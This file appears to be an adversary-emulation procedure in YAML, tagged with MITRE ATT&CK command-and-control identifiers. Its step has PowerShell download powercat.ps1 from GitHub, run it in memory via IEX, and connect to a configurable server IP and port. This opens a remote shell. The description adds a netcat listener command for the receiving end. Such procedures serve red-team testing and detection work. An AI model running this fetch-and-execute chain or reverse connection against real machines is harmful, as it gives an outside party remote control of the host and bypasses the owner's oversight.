api_version: "2.0"
name: Powercat C2
description: "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n"
args:
    - name: server_ip
      type: string
      default: 127.0.0.1
    - name: server_port
      type: int
      default: "80"
uuid: 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1095: Non-Application Layer Protocol'
requirements:
    platforms:
        - os: windows
steps:
    - name: powercat-c2
      inline: |
        IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
        powercat -c {{.Args.server_ip}} -p {{.Args.server_port}}
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
